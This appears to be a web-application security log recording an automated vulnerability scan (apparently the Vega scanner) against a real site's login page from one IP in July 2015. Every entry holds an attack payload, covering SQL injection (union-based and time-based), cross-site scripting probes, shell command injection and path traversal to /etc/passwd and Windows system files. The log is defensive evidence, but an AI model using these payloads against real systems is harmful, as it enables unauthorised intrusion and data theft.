+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: http://www.a3ultimate.com/ACP/ UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: http://www.a3ultimate.com/ACP/ UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: http://www.a3ultimate.com/ACP/ UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: http://www.a3ultimate.com/ACP/ UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/', Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/\', Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'', Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" AND 1=2 -- , Fixed: http://www.a3ultimate.com/ACP/ AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" AND 1=1 -- , Fixed: http://www.a3ultimate.com/ACP/ AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' AND 1=2 -- , Fixed: http://www.a3ultimate.com/ACP/ AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'"'"'"'", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' AND 1=1 -- , Fixed: http://www.a3ultimate.com/ACP/ AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/''''"""", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/\\'\\", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/\'\", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"></vega><vega>, Fixed: vega/vegavega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:25 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"><vega></vega>, Fixed: vegavega/vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/\\'\\", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'uname', Fixed: http://www.a3ultimate.com/ACP/uname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'true', Fixed: http://www.a3ultimate.com/ACP/true, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'false', Fixed: http://www.a3ultimate.com/ACP/false, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/"`true`", Fixed: http://www.a3ultimate.com/ACP/true, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/"`uname`", Fixed: http://www.a3ultimate.com/ACP/uname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/`uname`, Fixed: http://www.a3ultimate.com/ACP/uname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:26 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/"`false`", Fixed: http://www.a3ultimate.com/ACP/false, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/`false`, Fixed: http://www.a3ultimate.com/ACP/false, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/`true`, Fixed: http://www.a3ultimate.com/ACP/true, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: ' -->">'>'"<vvv000479v045225>, Fixed:  --vvv000479v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: " -->">'>'"<vvv000478v045225>, Fixed:  --vvv000478v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: ' style=vvv000477v045225, Fixed:  style=vvv000477v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: ' onMouseOver=vvv000476v045225, Fixed:  onMouseOver=vvv000476v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: " style=vvv000475v045225, Fixed:  style=vvv000475v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: " onMouseOver=vvv000474v045225, Fixed:  onMouseOver=vvv000474v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' -->">'>'"<vvv000471v045225>, Fixed: http://www.a3ultimate.com/ACP/ --vvv000471v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/
+ -->">'>'"<vvv000469v045225>, Fixed: http://www.a3ultimate.com/ACP/
+ --vvv000469v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/*/ -->">'>'"<vvv000470v045225>, Fixed: http://www.a3ultimate.com/ACP/*/ --vvv000470v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/ src=-->">'>'"<vvv000468v045225>, Fixed: http://www.a3ultimate.com/ACP/ src=--vvv000468v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" src=-->">'>'"<vvv000467v045225>, Fixed: http://www.a3ultimate.com/ACP/ src=--vvv000467v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/</textarea>-->">'>'"<vvv000466v045225>, Fixed: http://www.a3ultimate.com/ACP//textarea--vvv000466v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/.htaccess.aspx-->">'>'"<vvv000465v045225>, Fixed: http://www.a3ultimate.com/ACP/.htaccess.aspx--vvv000465v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:29 PM IP: 43.245.149.43 User : Not loggedin Code: " src=http://vega.invalid/;?, Fixed:  src=http://vega.invalid/;?, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:29 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/'", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:29 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/\'\", Fixed: http://www.a3ultimate.com/ACP/, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:52 PM IP: 43.245.149.43 User : Not loggedin Code: /../../../../../../../../../../../../etc/passwd , Fixed: /../../../../../../../../../../../../etc/passwd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:54 PM IP: 43.245.149.43 User : Not loggedin Code: " ; /bin/sleep 31 ;, Fixed:  ; /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:51:37 PM IP: 43.245.149.43 User : Not loggedin Code: /../../../../../../../../../../../../etc/passwd , Fixed: /../../../../../../../../../../../../etc/passwd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:51:37 PM IP: 43.245.149.43 User : Not loggedin Code: " ; /bin/sleep 31 ;, Fixed:  ; /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:51:37 PM IP: 43.245.149.43 User : Not loggedin Code: e" or 1 eq 1 or "a" = "a, Fixed: e or 1 eq 1 or a = a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:52:20 PM IP: 43.245.149.43 User : Not loggedin Code: ' ; /bin/sleep 31 ;, Fixed:  ; /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:52:51 PM IP: 43.245.149.43 User : Not loggedin Code: e' or true() or 'a'='a, Fixed: e or true() or a=a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:52:51 PM IP: 43.245.149.43 User : Not loggedin Code: ' ; /bin/sleep 31 ;, Fixed:  ; /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:18 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" AND SLEEP(30) -- , Fixed: Joey AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:19 PM IP: 43.245.149.43 User : Not loggedin Code: | /bin/sleep 31 ;, Fixed:  /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:19 PM IP: 43.245.149.43 User : Not loggedin Code: /etc/passwd , Fixed: /etc/passwd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:31 PM IP: 43.245.149.43 User : Not loggedin Code: vega" AND SLEEP(30) -- , Fixed: vega AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:52 PM IP: 43.245.149.43 User : Not loggedin Code: | /bin/sleep 31 ;, Fixed:  /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:52 PM IP: 43.245.149.43 User : Not loggedin Code: /etc/passwd , Fixed: /etc/passwd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:52 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" AND SLEEP(30) -- , Fixed: http://www.a3ultimate.com/ACP/ AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:53:52 PM IP: 43.245.149.43 User : Not loggedin Code: e" or true() or "a"="a, Fixed: e or true() or a=a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:54:36 PM IP: 43.245.149.43 User : Not loggedin Code: "| /bin/sleep 31 ;, Fixed:  /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:54:37 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' AND SLEEP(30) -- , Fixed: Joey AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:54:38 PM IP: 43.245.149.43 User : Not loggedin Code: vega' AND SLEEP(30) -- , Fixed: vega AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:55:49 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' AND SLEEP(30) -- , Fixed: http://www.a3ultimate.com/ACP/ AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:55:49 PM IP: 43.245.149.43 User : Not loggedin Code: "| /bin/sleep 31 ;, Fixed:  /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:06 PM IP: 43.245.149.43 User : Not loggedin Code: file:/etc/passwd , Fixed: file:/etc/passwd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:06 PM IP: 43.245.149.43 User : Not loggedin Code: '| /bin/sleep 31 ;, Fixed:  /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" OR (SELECT SLEEP(30)) -- , Fixed: Joey OR (SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:10 PM IP: 43.245.149.43 User : Not loggedin Code: vega" OR (SELECT SLEEP(30)) -- , Fixed: vega OR (SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:17 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" OR (SELECT SLEEP(30)) -- , Fixed: http://www.a3ultimate.com/ACP/ OR (SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:17 PM IP: 43.245.149.43 User : Not loggedin Code: '| /bin/sleep 31 ;, Fixed:  /bin/sleep 31 ;, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:17 PM IP: 43.245.149.43 User : Not loggedin Code: file:/etc/passwd , Fixed: file:/etc/passwd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:27 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' OR (SELECT SLEEP(30)) -- , Fixed: Joey OR (SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:28 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: ........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:56:54 PM IP: 43.245.149.43 User : Not loggedin Code: vega' OR (SELECT SLEEP(30)) -- , Fixed: vega OR (SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:57:39 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: ........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:57:39 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' OR (SELECT SLEEP(30)) -- , Fixed: http://www.a3ultimate.com/ACP/ OR (SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:57:50 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: ........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:57:50 PM IP: 43.245.149.43 User : Not loggedin Code: " ping.exe -n 31 127.0.0.1, Fixed:  ping.exe -n 31 127.0.0.1, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:57:51 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' OR EXISTS(SELECT SLEEP(30)) -- , Fixed: Joey OR EXISTS(SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:57:54 PM IP: 43.245.149.43 User : Not loggedin Code: vega' OR EXISTS(SELECT SLEEP(30)) -- , Fixed: vega OR EXISTS(SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:19 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' OR EXISTS(SELECT SLEEP(30)) -- , Fixed: http://www.a3ultimate.com/ACP/ OR EXISTS(SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:19 PM IP: 43.245.149.43 User : Not loggedin Code: " ping.exe -n 31 127.0.0.1, Fixed:  ping.exe -n 31 127.0.0.1, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:19 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: ........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:27 PM IP: 43.245.149.43 User : Not loggedin Code: file:..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: file:........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:44 PM IP: 43.245.149.43 User : Not loggedin Code: file:..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: file:........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:54 PM IP: 43.245.149.43 User : Not loggedin Code: file:\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: file:........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:58:56 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" OR EEXISTS(SELECT SLEEP(30)) -- , Fixed: Joey OR EEXISTS(SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:59:02 PM IP: 43.245.149.43 User : Not loggedin Code: vega" OR EEXISTS(SELECT SLEEP(30)) -- , Fixed: vega OR EEXISTS(SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:59:10 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" OR EEXISTS(SELECT SLEEP(30)) -- , Fixed: http://www.a3ultimate.com/ACP/ OR EEXISTS(SELECT SLEEP(30)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:59:11 PM IP: 43.245.149.43 User : Not loggedin Code: file:\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd, Fixed: file:........................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:00:32 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' UNION SELECT SLEEP(30) -- , Fixed: Joey UNION SELECT SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:00:38 PM IP: 43.245.149.43 User : Not loggedin Code: vega' UNION SELECT SLEEP(30) -- , Fixed: vega UNION SELECT SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:01:01 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' UNION SELECT SLEEP(30) -- , Fixed: http://www.a3ultimate.com/ACP/ UNION SELECT SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:01:21 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" UNION SELECT SLEEP(30) -- , Fixed: Joey UNION SELECT SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:01:25 PM IP: 43.245.149.43 User : Not loggedin Code: vega" UNION SELECT SLEEP(30) -- , Fixed: vega UNION SELECT SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:01:43 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" UNION SELECT SLEEP(30) -- , Fixed: http://www.a3ultimate.com/ACP/ UNION SELECT SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:01:53 PM IP: 43.245.149.43 User : Not loggedin Code: ....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\etc\passwd, Fixed: ................................................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:09 PM IP: 43.245.149.43 User : Not loggedin Code: ....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\etc\passwd, Fixed: ................................................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:11 PM IP: 43.245.149.43 User : Not loggedin Code: 1' AND SLEEP(30) -- , Fixed: 1 AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:12 PM IP: 43.245.149.43 User : Not loggedin Code: \....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\etc\passwd, Fixed: ................................................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:18 PM IP: 43.245.149.43 User : Not loggedin Code: 1' AND SLEEP(30) -- , Fixed: 1 AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:18 PM IP: 43.245.149.43 User : Not loggedin Code: 1' AND SLEEP(30) -- , Fixed: 1 AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:23 PM IP: 43.245.149.43 User : Not loggedin Code: \....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\etc\passwd, Fixed: ................................................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:26 PM IP: 43.245.149.43 User : Not loggedin Code: \\..\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\etc\passwd, Fixed: ..................................................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:27 PM IP: 43.245.149.43 User : Not loggedin Code: 1" AND SLEEP(30) -- , Fixed: 1 AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:33 PM IP: 43.245.149.43 User : Not loggedin Code: 1" AND SLEEP(30) -- , Fixed: 1 AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:33 PM IP: 43.245.149.43 User : Not loggedin Code: 1" AND SLEEP(30) -- , Fixed: 1 AND SLEEP(30) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:38 PM IP: 43.245.149.43 User : Not loggedin Code: \\..\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\etc\passwd, Fixed: ..................................................etcpasswd, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:02:41 PM IP: 43.245.149.43 User : Not loggedin Code: C:\boot.ini, Fixed: C:boot.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:06 PM IP: 43.245.149.43 User : Not loggedin Code: C:\boot.ini, Fixed: C:boot.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" WAITFOR DELAY '00:00:30' -- , Fixed: Joey WAITFOR DELAY 00:00:30 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:27 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" WAITFOR DELAY '00:00:30' -- , Fixed: http://www.a3ultimate.com/ACP/ WAITFOR DELAY 00:00:30 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:27 PM IP: 43.245.149.43 User : Not loggedin Code: vega" WAITFOR DELAY '00:00:30' -- , Fixed: vega WAITFOR DELAY 00:00:30 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:35 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\..\..\..\..\..\..\..\..\..\..\boot.ini, Fixed: ........................boot.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:38 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' WAITFOR DELAY '00:00:30' -- , Fixed: Joey WAITFOR DELAY 00:00:30 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:51 PM IP: 43.245.149.43 User : Not loggedin Code: vega' WAITFOR DELAY '00:00:30' -- , Fixed: vega WAITFOR DELAY 00:00:30 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:51 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' WAITFOR DELAY '00:00:30' -- , Fixed: http://www.a3ultimate.com/ACP/ WAITFOR DELAY 00:00:30 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:03:56 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\..\..\..\..\..\..\..\..\..\..\boot.ini, Fixed: ........................boot.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:01 PM IP: 43.245.149.43 User : Not loggedin Code: 1 WAITFOR DELAY '00:00:30' --, Fixed: 1 WAITFOR DELAY 00:00:30 --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:12 PM IP: 43.245.149.43 User : Not loggedin Code: 1 WAITFOR DELAY '00:00:30' --, Fixed: 1 WAITFOR DELAY 00:00:30 --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:12 PM IP: 43.245.149.43 User : Not loggedin Code: 1 WAITFOR DELAY '00:00:30' --, Fixed: 1 WAITFOR DELAY 00:00:30 --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:14 PM IP: 43.245.149.43 User : Not loggedin Code: file:/C:\boot.ini, Fixed: file:/C:boot.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:41 PM IP: 43.245.149.43 User : Not loggedin Code: file:/C:\boot.ini, Fixed: file:/C:boot.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:48 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Fixed: Joey AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:53 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/" AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Fixed: http://www.a3ultimate.com/ACP/ AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:53 PM IP: 43.245.149.43 User : Not loggedin Code: vega" AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Fixed: vega AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:04:59 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Fixed: Joey AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:05 PM IP: 43.245.149.43 User : Not loggedin Code: vega' AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Fixed: vega AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:07 PM IP: 43.245.149.43 User : Not loggedin Code: C:\windows\win.ini, Fixed: C:windowswin.ini, Link: http://www.a3ultimate.com/login.php
